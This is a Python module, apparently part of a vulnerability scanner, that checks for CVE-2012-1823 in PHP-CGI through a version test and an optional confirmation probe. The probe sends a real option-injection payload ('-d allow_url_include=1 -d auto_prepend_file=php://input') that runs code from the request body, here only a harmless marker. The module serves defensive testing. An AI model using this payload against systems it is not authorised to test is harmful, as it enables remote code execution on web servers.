from __future__ import annotations

from typing import Any

from ...core.models import Confidence, Status
from ...core.versions import parse_version_safe
from .common import harmless_cgi_marker_probe, runtime_finding

CVE_ID = "CVE-2012-1823"
NAME = "PHP-CGI query-string option injection"
RULE = "PHP CGI before 5.3.13 and PHP CGI 5.4.0-5.4.2"
ACTION = "Replace the unsupported PHP release and ensure the web server cannot pass query-string options to php-cgi."


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if value < parse_version_safe("5.3.13") or parse_version_safe("5.4.0") <= value < parse_version_safe("5.4.3"):
        return Status.LIKELY_VULNERABLE
    return Status.PATCHED


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    php_runtime: dict[str, Any] | None = None,
    **kwargs: Any,
):
    result = runtime_finding(
        cve=CVE_ID,
        name=NAME,
        rule=RULE,
        php_runtime=php_runtime,
        classify=classify_version,
        action=ACTION,
        exploit_available=True,
    )
    if not run_exploit_check or result.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        return result
    confirmed, proof_url, http_status = harmless_cgi_marker_probe(
        target_url,
        php_runtime or {},
        "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
        timeout,
        proxy,
    )
    result.exploit_ran = True
    result.proof_url = proof_url
    if confirmed:
        result.status, result.confidence = Status.VULNERABLE, Confidence.CONFIRMED
        result.detail = "PHP-CGI option injection executed a unique harmless marker from the request body."
    else:
        result.status, result.confidence = Status.NOT_CONFIRMED, Confidence.MEDIUM
        result.detail += (
            f" The safe PHP-CGI marker was not returned (HTTP {http_status}); CGI exposure was not confirmed."
        )
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "php",
        "name": NAME,
        "component": "PHP runtime",
        "affected_rule": RULE,
        "affected_versions": ["<5.3.13", ">=5.4.0,<5.4.3"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "references": ["https://www.php.net/archive/2012.php", "https://nvd.nist.gov/vuln/detail/CVE-2012-1823"],
    }
